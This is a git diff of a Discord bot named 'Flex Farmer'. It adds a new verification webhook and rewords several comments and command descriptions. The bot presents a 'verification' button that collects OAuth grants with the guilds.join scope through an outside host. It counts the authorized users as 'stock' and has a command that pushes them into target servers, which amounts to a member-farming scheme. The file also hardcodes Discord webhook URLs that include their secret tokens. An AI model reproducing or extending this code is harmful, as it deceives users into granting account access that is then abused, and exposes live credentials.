@@ -31,13 +31,14 @@ const WEBHOOKS = {
     RESTOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
     LIVE_STOCK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062223049789462/5Mf4bAK5hH33ArZ2PNTZF7GB2ccp4ZClErmt5KIv1v5VROS3tmiVZRR5pnbcyutAyIVc' }),
     ADD_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062454743007316/MhzdNOi6VDiVthZh9-p4YwUdWMTRrC926xohzUu3mvw1yOXkwtH9BQFshApFcrOcsIL4' }),
+    VERIFICATION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565060498955698436/Y3TO5kufTLMNpJVt5wXCxV-nxXP0eH4qz7kxkS299viAANZLKwiTjYVyPZAdnUPSSW9g' }),
     BOOST_STICK: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062620732465294/5mZAWSI6o05Q_EHdWX67qE2ws5qIKvsXgTqWC8h1khpFmKHtqNTxWt7Ann2nqklA7y3Q' }),
     USE_R_BOT: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565062878569041920/BklXjuG2g9QoqEwgtcTchZvpYqMOzFhl5Wnjp8fb3c1IZZedoAOwuqW0C6b_9yyYXB51' }),
     STATUS: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565063716674863245/hGnnYlGvnmiH08d0PfTqhW_7t97XDI1PaVqXMb-9_2qI3CGeZA6NgNPXncfNwUEG5BmD' }),
     EXECUTION: new WebhookClient({ url: 'https://discord.com/api/webhooks/1565043524284457015/ln5xswheqPX20TbuQ_YG4V52h0T8CtvJM5gah_QgmPDsnr0bxWCr9XJl19BmkMiPl7NZ' })
 };
 
-// Fixed Verification OAuth URL
+// Fixed Automatic Verification OAuth URL
 const AUTOMATIC_VERIFY_OAUTH_URL = 'https://discord.com/oauth2/authorize?client_id=1561438987464483048&response_type=code&redirect_uri=https%3A%2F%2Ffarmerauth-production.up.railway.app&scope=identify+guilds.join';
 const RBOT_SERVER_INVITE = 'https://discord.gg/ZK3Er7Xgdq';
 
@@ -129,10 +130,10 @@ const client = new Client({
 const slashCommands = [
     new SlashCommandBuilder()
         .setName('verify')
-        .setDescription('Create a customized verification panel')
+        .setDescription('Create a customized verification panel with link button')
         .addStringOption(option => option.setName('description').setDescription('Main embed message text').setRequired(true))
         .addStringOption(option => option.setName('title').setDescription('Optional embed title').setRequired(false))
-        .addStringOption(option => option.setName('webhook_url').setDescription('Optional Webhook URL to dispatch through').setRequired(false)),
+        .addStringOption(option => option.setName('webhook_url').setDescription('Optional custom Webhook URL to dispatch through').setRequired(false)),
     new SlashCommandBuilder()
         .setName('say')
         .setDescription('Send custom message or embed')
@@ -283,7 +284,7 @@ app.get('/', async (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on port ${PORT}`));
 
-// --- Live Persistent Stock Message Updater (Channel 1563253481853427745) ---
+// --- Live Persistent Stock Message Editor (Channel 1563253481853427745) ---
 async function updateLiveStockPanel() {
     try {
         const stockChannel = client.channels.cache.get(CHANNELS.LIVE_STOCK_PANEL) || await client.channels.fetch(CHANNELS.LIVE_STOCK_PANEL);
@@ -310,7 +311,7 @@ async function updateLiveStockPanel() {
             }
         }
 
-        const newMsg = await WEBHOOKS.LIVE_STOCK.send({ embeds: [stockEmbed], wait: true });
+        const newMsg = await stockChannel.send({ embeds: [stockEmbed] });
         dbData.liveStockMessageId = newMsg.id;
         writeDB(dbData);
     } catch (err) {
@@ -336,7 +337,7 @@ client.once('ready', async () => {
     setInterval(updateLiveStockPanel, 30000);
 });
 
-// --- Button Interaction Handler (Restock Confirmation & Announcements) ---
+// --- Button Interaction Handler & Slash Commands ---
 client.on('interactionCreate', async interaction => {
     if (interaction.isButton()) {
         if (interaction.customId.startsWith('restock_yes_')) {
@@ -396,8 +397,9 @@ client.on('interactionCreate', async interaction => {
                 return interaction.reply({ content: 'Verification embed sent via target webhook.', ephemeral: true });
             }
 
-            await WEBHOOKS.ADD_BOT.send({ embeds: [embed], components: [row] });
-            return interaction.reply({ content: 'Verification embed created successfully via Add-Bot webhook.', ephemeral: true });
+            // Dispatches through your specific Verification webhook channel by default
+            await WEBHOOKS.VERIFICATION.send({ embeds: [embed], components: [row] });
+            return interaction.reply({ content: 'Verification embed created successfully via Verification webhook.', ephemeral: true });
         } catch (err) {
             return interaction.reply({ content: `Failed to create verification panel: ${err.message}`, ephemeral: true });
         }
@@ -509,7 +511,7 @@ client.on('messageCreate', async message => {
             .addFields(
                 { 
                     name: 'Core & Verification', 
-                    value: `\`/verify\` - Slash command to generate customizable verification embed\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
+                    value: `\`/verify\` - Slash command to generate customizable verification embed with link button\n\`/say\` - Slash command to send messages/embeds\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                 },
                 { 
                     name: 'Config & Management', 
